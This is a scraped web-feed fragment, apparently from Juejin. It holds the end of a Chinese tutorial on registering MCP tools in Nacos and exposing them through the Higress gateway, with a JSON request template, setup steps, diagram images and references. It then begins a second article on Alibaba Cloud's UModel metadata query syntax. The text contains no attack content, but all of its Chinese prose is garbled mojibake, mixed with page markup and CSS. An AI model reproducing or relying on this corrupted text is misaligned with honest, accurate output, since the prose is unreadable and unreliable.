<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
Â Â <span class="hljs-attr">"requestTemplate"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-punctuation">{</span>
Â  Â Â <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"/xxx/list.json"</span><span class="hljs-punctuation">,</span>
Â  Â Â <span class="hljs-attr">"method"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"GET"</span><span class="hljs-punctuation">,</span>
Â  Â Â <span class="hljs-attr">"headers"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
Â  Â Â <span class="hljs-attr">"argsToUrlParam"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
Â Â <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
Â Â <span class="hljs-attr">"responseTemplate"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-punctuation">{</span>
Â  Â Â <span class="hljs-attr">"body"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"{{.}}"</span>
Â Â <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>2ï¼‰åœ¨ Higress ä¸­é…ç½® MCP Nacos çš„æœåŠ¡æ¥æºï¼š</strong></p>
<p>è¿™é‡Œä¸ºäº†å¿«é€Ÿæµ‹è¯•å…³é—­äº† Nacos çš„è®¤è¯ï¼Œçº¿ä¸Šç¯å¢ƒå»ºè®®å¼€å¯ Nacos çš„è®¤è¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31950e12263e4c80b2ac2b9391c6a910~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=CY1pfDkMjfCyzh1RzzQzDOj4E3g%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>3ï¼‰åœ¨ Cursor/Cherry Studio ä¸­é…ç½®å¯¹å¤–æš´éœ²çš„ Higress æœåŠ¡åœ°å€å’Œ uriï¼Œå³å¯ä½¿ç”¨ MCP å·¥å…·ï¼š</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb0c06bc1fe04cb89931c0c337d67e1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=6Smx6MVRHg56dTsEO%2FKlNEPzqjk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc7470b810164f83b9b8ca7d89834aae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=jvOuwgiMFNhQsb9FDi99mP73GPA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-13">è®¾è®¡å›¾</h2>
<h3 data-id="heading-14">å®¹ç¾æ¶æ„</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e48188f92d884ebd9159719acf34ae38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=n2kgUuKswot4UITM1wakegf0nBI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿›å…¥æµè§ˆå™¨æŸ¥çœ‹åŸå›¾ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fimg.alicdn.com%2Fimgextra%2Fi2%2FO1CN0138v82b1L7vNY3RQdo_!!6000000001253-2-tps-6507-5451.png" target="_blank" title="https://img.alicdn.com/imgextra/i2/O1CN0138v82b1L7vNY3RQdo_!!6000000001253-2-tps-6507-5451.png" ref="nofollow noopener noreferrer">img.alicdn.com/imgextra/i2â€¦</a></p>
<p>åœ¨æ•´ä¸ª MCP ç½‘å…³ä¸­ï¼Œé€šè¿‡ uri æ¥è·¯ç”±ä¸åŒçš„ MCP å·¥å…·ï¼Œå®ç°å·¥å…·çš„éš”ç¦»ã€‚</p>
<h3 data-id="heading-15">é€»è¾‘æ¨¡å—å›¾</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58740208297546f9bb5f91a6f3fea541~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=dcBqJ0pPEgGf9I085GFIzeU9Vgc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-16">æ—¶åºå›¾</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c3feed715ef439ab853acdd4f56d7d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=zwI7xElEp5JbbY6cAc8fSIrdR3g%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>é™„å½•ï¼š</strong></p>
<p>[1] åŸºäº all-in-one çš„ docker é•œåƒ</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhigress-group%2Fhigress-standalone%2Fblob%2Fmain%2Fall-in-one%2FDockerfile" target="_blank" title="https://github.com/higress-group/higress-standalone/blob/main/all-in-one/Dockerfile" ref="nofollow noopener noreferrer">github.com/higress-groâ€¦</a></p>
<p>[2] higress-plugin-server</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnkirito.moe%2Fhigress-plugin-server%2F" target="_blank" title="https://www.cnkirito.moe/higress-plugin-server/" ref="nofollow noopener noreferrer">www.cnkirito.moe/higress-pluâ€¦</a></p>
<p>[3] åŸºäº nacos-server çš„é•œåƒè¿›è¡Œéƒ¨ç½²</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnacos-group%2Fnacos-docker%2Fblob%2Fmaster%2Fbuild%2FDockerfile" target="_blank" title="https://github.com/nacos-group/nacos-docker/blob/master/build/Dockerfile" ref="nofollow noopener noreferrer">github.com/nacos-groupâ€¦</a></p>
<p>[4] è„šæœ¬æºç </p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkmodules%2Fpeer-finder%2Fblob%2Fmaster%2Fpeer-finder.go" target="_blank" title="https://github.com/kmodules/peer-finder/blob/master/peer-finder.go" ref="nofollow noopener noreferrer">github.com/kmodules/peâ€¦</a></p>
<p>[5] mysql-schema.sql</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos%2Fblob%2Fdevelop%2Fdistribution%2Fconf%2Fmysql-schema.sql" target="_blank" title="https://github.com/alibaba/nacos/blob/develop/distribution/conf/mysql-schema.sql" ref="nofollow noopener noreferrer">github.com/alibaba/nacâ€¦</a></p>
<p>[6] Higress æä¾›ä¸°å¯Œé‰´æƒèƒ½åŠ›</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhigress.cn%2Fdocs%2Flatest%2Fplugins%2Fauthentication%2Fbasic-auth%2F" target="_blank" title="https://higress.cn/docs/latest/plugins/authentication/basic-auth/" ref="nofollow noopener noreferrer">higress.cn/docs/latestâ€¦</a></p>
<p>[7]Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247575770%26idx%3D1%26sn%3Dca41d8dade57fcf378e1f7c5a5e0dca5%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247575770&amp;idx=1&amp;sn=ca41d8dade57fcf378e1f7c5a5e0dca5&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">åŸºäº Nacos + Higress Â çš„ MCP å¼€å‘æ–°èŒƒå¼ï¼Œæ‰‹æŠŠæ‰‹æ•™ç¨‹æ¥äº†ï¼</a></p>
<p>[8]Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU0MzkyMTgzNg%3D%3D%26mid%3D2247486505%26idx%3D1%26sn%3Db61997531cce196d0b7fc46f79a003be%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU0MzkyMTgzNg==&amp;mid=2247486505&amp;idx=1&amp;sn=b61997531cce196d0b7fc46f79a003be&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">Nacos 3.0 æ­£å¼å‘å¸ƒï¼šMCP Registryã€å®‰å…¨é›¶ä¿¡ä»»ã€é“¾æ¥æ›´å¤šç”Ÿæ€</a></p>
<p>[9] ä¿®æ”¹å†…ç½®æ’ä»¶çš„é•œåƒåœ°å€</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhigress.cn%2Fdocs%2Flatest%2Fops%2Fhow-tos%2Fbuiltin-plugin-url%2F" target="_blank" title="https://higress.cn/docs/latest/ops/how-tos/builtin-plugin-url/" ref="nofollow noopener noreferrer">higress.cn/docs/latestâ€¦</a></p>
<p>[10] Nacos é›†ç¾¤æ¨¡å¼</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fnacos.io%2Fdocs%2Flatest%2Fmanual%2Fadmin%2Fdeployment%2Fdeployment-cluster%2F" target="_blank" title="https://nacos.io/docs/latest/manual/admin/deployment/deployment-cluster/" ref="nofollow noopener noreferrer">nacos.io/docs/latestâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[UModel æŸ¥è¯¢ï¼šé©¯æœâ€œå¯è§‚æµ‹æ€§æ··ä¹±â€ï¼Œé˜¿é‡Œäº‘çš„å›¾æ¨¡å‹å»ºæ¨¡åˆ©å™¨ï¼]]></title>    <link>https://juejin.cn/post/7581097545670524947</link>    <guid>https://juejin.cn/post/7581097545670524947</guid>    <pubDate>2025-12-08T08:26:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581097545670524947" data-draft-id="7580616979473252358" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="UModel æŸ¥è¯¢ï¼šé©¯æœâ€œå¯è§‚æµ‹æ€§æ··ä¹±â€ï¼Œé˜¿é‡Œäº‘çš„å›¾æ¨¡å‹å»ºæ¨¡åˆ©å™¨ï¼"/> <meta itemprop="keywords" content="äº‘åŸç”Ÿ"/> <meta itemprop="datePublished" content="2025-12-08T08:26:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘äº‘åŸç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            UModel æŸ¥è¯¢ï¼šé©¯æœâ€œå¯è§‚æµ‹æ€§æ··ä¹±â€ï¼Œé˜¿é‡Œäº‘çš„å›¾æ¨¡å‹å»ºæ¨¡åˆ©å™¨ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘äº‘åŸç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T08:26:00.000Z" title="Mon Dec 08 2025 08:26:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1AWSxBqEtQ%2F" target="_blank" title="https://www.bilibili.com/video/BV1AWSxBqEtQ/" ref="nofollow noopener noreferrer">ç‚¹å‡»æ­¤å¤„ï¼Œç«‹å³æŸ¥çœ‹è§†é¢‘è¯¾ç¨‹ï¼</a></p>
<h2 data-id="heading-0">èƒŒæ™¯</h2>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ ç«™åœ¨ä¸€ä¸ªå·¨å¤§çš„å›¾ä¹¦é¦†é‡Œï¼Œè¿™é‡Œæœ‰æˆåƒä¸Šä¸‡æœ¬ä¹¦ï¼Œä½†æ¯æœ¬ä¹¦çš„ç›®å½•éƒ½æ•£è½åœ¨ä¸åŒçš„æˆ¿é—´é‡Œï¼Œè€Œä¸”æ¯é—´æˆ¿é—´çš„ç´¢å¼•æ–¹å¼éƒ½ä¸ä¸€æ ·ã€‚å½“ä½ æƒ³è¦æ‰¾ä¸€æœ¬å…³äºâ€œæœåŠ¡è°ƒç”¨â€çš„ä¹¦æ—¶ï¼Œä½ éœ€è¦åœ¨ APM æˆ¿é—´ã€K8s æˆ¿é—´ã€äº‘èµ„æºæˆ¿é—´ä¹‹é—´æ¥å›å¥”æ³¢ï¼Œè¿˜è¦è®°ä½æ¯ä¸ªæˆ¿é—´ä¸åŒçš„æŸ¥æ‰¾è§„åˆ™...</p>
<p>è¿™å°±æ˜¯å¾ˆå¤šä¼ä¸šåœ¨å¯è§‚æµ‹æ€§é¢†åŸŸé¢ä¸´çš„çœŸå®å›°å¢ƒã€‚è€Œ UModel å°±åƒæ˜¯ä¸ºè¿™ä¸ªæ··ä¹±çš„å›¾ä¹¦é¦†å»ºç«‹äº†ä¸€å¥—ç»Ÿä¸€çš„â€œæ™ºèƒ½ç®¡ç†ç³»ç»Ÿâ€ï¼Œè®©ä½ èƒ½å¤Ÿè½»æ¾æ¢ç´¢å’Œç†è§£æ•´ä¸ªçŸ¥è¯†å›¾è°±çš„ç»“æ„ã€‚</p>
<h3 data-id="heading-1">1.1 UModel æ˜¯ä»€ä¹ˆ</h3>
<p>UModel æ˜¯ä¸€ç§åŸºäºå›¾æ¨¡å‹çš„å¯è§‚æµ‹æ•°æ®å»ºæ¨¡æ–¹æ³•ï¼Œæ—¨åœ¨è§£å†³ä¼ä¸šçº§ç¯å¢ƒä¸­å¯è§‚æµ‹æ•°æ®é‡‡é›†ã€ç»„ç»‡å’Œåˆ©ç”¨çš„æ ¸å¿ƒæŒ‘æˆ˜ã€‚UModel é‡‡ç”¨ Nodeï¼ˆèŠ‚ç‚¹ï¼‰å’Œ Linkï¼ˆè¾¹ï¼‰ç»„æˆçš„å›¾ç»“æ„æ¥æè¿° IT ä¸–ç•Œï¼Œé€šè¿‡æ ‡å‡†åŒ–çš„æ•°æ®å»ºæ¨¡æ–¹å¼ï¼Œå®ç°å¯è§‚æµ‹æ•°æ®çš„ç»Ÿä¸€è¡¨ç¤ºã€å­˜å‚¨è§£è€¦å’Œæ™ºèƒ½åˆ†æã€‚</p>
<p>ä½œä¸ºé˜¿é‡Œäº‘å¯è§‚æµ‹ä½“ç³»çš„æ•°æ®å»ºæ¨¡åŸºç¡€ï¼ŒUModel ä¸ºä¼ä¸šæä¾›äº†ä¸€å¥—é€šç”¨çš„å¯è§‚æµ‹â€œäº¤äº’è¯­è¨€â€ï¼Œè®©äººã€ç¨‹åºå’Œ AI éƒ½èƒ½å¤Ÿç†è§£å’Œåˆ†æå¯è§‚æµ‹æ•°æ®ï¼Œä»è€Œæ„å»ºçœŸæ­£çš„å…¨æ ˆå¯è§‚æµ‹èƒ½åŠ›ã€‚</p>
<h4 data-id="heading-2">æ ¸å¿ƒæ¦‚å¿µ</h4>
<p>UModel é‡‡ç”¨å›¾è®ºçš„åŸºæœ¬æ¦‚å¿µï¼Œä½¿ç”¨Â Nodeï¼ˆèŠ‚ç‚¹ï¼‰å’ŒÂ Linkï¼ˆè¾¹ï¼‰ç»„æˆæœ‰å‘å›¾æ¥æè¿° IT ç³»ç»Ÿï¼š</p>
<ul>
<li>Nodeï¼ˆèŠ‚ç‚¹ï¼‰ï¼šæ ¸å¿ƒéƒ¨åˆ†ä¸º Setï¼ˆæ•°æ®é›†ï¼‰ï¼Œè¡¨ç¤ºåŒç±»å‹å®ä½“æˆ–æ•°æ®çš„é›†åˆï¼Œå¦‚ EntitySetï¼ˆå®ä½“é›†ï¼‰ã€MetricSetï¼ˆæŒ‡æ ‡é›†ï¼‰ã€LogSetï¼ˆæ—¥å¿—é›†ï¼‰ç­‰ï¼›æ­¤å¤–è¿˜åŒ…å«æ•°æ®é›†çš„å­˜å‚¨ç±»å‹ï¼ˆStorageï¼‰ï¼Œå¦‚ SLSã€Prometheusã€MySQL ç­‰</li>
<li>Linkï¼ˆå…³è”ï¼‰ï¼šè¡¨ç¤º Node ä¹‹é—´çš„å…³ç³»ï¼Œå¦‚ EntitySetLinkï¼ˆå®ä½“å…³è”ï¼‰ã€DataLinkï¼ˆæ•°æ®å…³è”ï¼‰ã€StorageLinkï¼ˆå­˜å‚¨å…³è”ï¼‰ç­‰</li>
<li>Fieldï¼ˆå­—æ®µï¼‰ï¼šç”¨äºçº¦æŸå’Œæè¿° Set å’Œ Link çš„å±æ€§ï¼ŒåŒ…å«åç§°ã€ç±»å‹ã€çº¦æŸè§„åˆ™ã€åˆ†æç‰¹æ€§ç­‰ 20 å¤šç§é…ç½®é¡¹</li>
</ul>
<h3 data-id="heading-3">1.2 UModel æŸ¥è¯¢æ˜¯ä»€ä¹ˆ</h3>
<p>UModel æŸ¥è¯¢æ˜¯ EntityStore ä¸­ç”¨äºæŸ¥è¯¢çŸ¥è¯†å›¾è°±å…ƒæ•°æ®çš„ä¸“ç”¨æŸ¥è¯¢æ¥å£ï¼Œé€šè¿‡Â <code>.umodelÂ </code>æŸ¥è¯¢è¯­æ³•ï¼Œå¯ä»¥æ¢ç´¢ EntitySet å®šä¹‰ã€EntitySetLink å…³ç³»ä»¥åŠå®Œæ•´çš„çŸ¥è¯†å›¾è°±ç»“æ„ï¼Œä¸ºæ•°æ®å»ºæ¨¡åˆ†æå’Œ Schema ç®¡ç†æä¾›å¼ºå¤§æ”¯æŒã€‚</p>
<h4 data-id="heading-4">æŸ¥è¯¢ç›®æ ‡åŒºåˆ†</h4>
<p>UModel æŸ¥è¯¢ä¸å…¶ä»–æŸ¥è¯¢ç±»å‹çš„åŒºåˆ«ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e81bee11eb148fab48965bc2638cd23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765787160&amp;x-signature=9MZwRdZeKJoIEH7d9KARJOznCps%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>UModel æŸ¥è¯¢ä¸“æ³¨äºå…ƒæ•°æ®å±‚é¢çš„æ¢ç´¢ï¼Œå¸®åŠ©ç”¨æˆ·ç†è§£æ•°æ®æ¨¡å‹çš„ç»“æ„å’Œå®šä¹‰ï¼Œè€Œéå…·ä½“çš„è¿è¡Œæ—¶æ•°æ®ã€‚</p>
<h2 data-id="heading-5">UModel æŸ¥è¯¢</h2>
<h3 data-id="heading-6">2.1 æ•°æ®æ¨¡å‹</h3>
<h4 data-id="heading-7">æ•°æ®ç»“æ„</h4>
<p>UModel æŸ¥è¯¢è¿”å›çš„æ•°æ®å…·æœ‰å›ºå®šçš„äº”å­—æ®µç»“æ„ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccdea893da9a4cbc9d915fc03aa74c3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765787160&amp;x-signature=%2BGPa%2BHguPhM4HkYA1X0SBII8s%2B4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ³¨æ„ï¼š<code>metadataã€schema</code>ã€<code>spec</code>Â æ˜¯ JSON æ ¼å¼çš„ stringï¼Œéœ€è¦ä½¿ç”¨Â <code>json_extract_scalar</code> å‡½æ•°è¿›è¡Œæå–ã€‚</p>
<h4 data-id="heading-8">æ•°æ®ç¤ºä¾‹</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad1bf5346b1a431385b4a2cadd0b6d74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765787160&amp;x-signature=w0ZDAJGkyyyN%2FyQuSIJEY4xH%2B1g%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-9">2.2 æŸ¥è¯¢è¯­æ³•</h3>
<h4 data-id="heading-10">åŸºç¡€æŸ¥è¯¢è¯­æ³•</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åŸºç¡€æŸ¥è¯¢æ ¼å¼</span>
.umodelÂ <span class="hljs-operator">|</span>Â [SPLæ“ä½œ...]
<span class="hljs-comment">-- å¸¦é™åˆ¶æ¡ä»¶çš„æŸ¥è¯¢</span>
.umodelÂ <span class="hljs-operator">|</span>Â <span class="hljs-keyword">where</span>Â <span class="hljs-operator">&lt;</span><span class="hljs-keyword">condition</span><span class="hljs-operator">&gt;</span>Â <span class="hljs-operator">|</span>Â limitÂ <span class="hljs-operator">&lt;</span>count<span class="hljs-operator">&gt;</span>
</code></pre>
<h4 data-id="heading-11">æ ¸å¿ƒæŸ¥è¯¢æ¨¡å¼</h4>
<h5 data-id="heading-12">1. List åœºæ™¯ - åˆ—è¡¨æŸ¥è¯¢</h5>
<p>æŸ¥è¯¢æ‰€æœ‰ UModel æ•°æ®ï¼š</p>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-deletion">-- åˆ—å‡ºæ‰€æœ‰umodelæ•°æ®ï¼ˆä¸å»ºè®®ä½¿ç”¨ï¼‰</span>
.umodel
<span class="hljs-deletion">-- å¸¦åˆ†é¡µçš„æŸ¥è¯¢</span>
.umodel | limit 0, 10
</code></pre>
<p>æŒ‰ç±»å‹è¿‡æ»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">-- æŸ¥è¯¢æ‰€æœ‰EntitySetå®šä¹‰
.umodel |Â <span class="hljs-built_in">where</span>Â kind =Â <span class="hljs-string">'entity_set'</span>Â |Â <span class="hljs-built_in">limit</span>Â 0, 10
-- æŸ¥è¯¢æ‰€æœ‰EntitySetLinkå®šä¹‰
.umodel |Â <span class="hljs-built_in">where</span>Â kind =Â <span class="hljs-string">'entity_set_link'</span>Â |Â <span class="hljs-built_in">limit</span>Â 0, 10
-- æŸ¥è¯¢æ‰€æœ‰è¾¹ç±»å‹ï¼ˆå…³ç³»å®šä¹‰ï¼‰
.umodel |Â <span class="hljs-built_in">where</span>Â __type__ =Â <span class="hljs-string">'link'</span>Â |Â <span class="hljs-built_in">limit</span>Â 0, 10
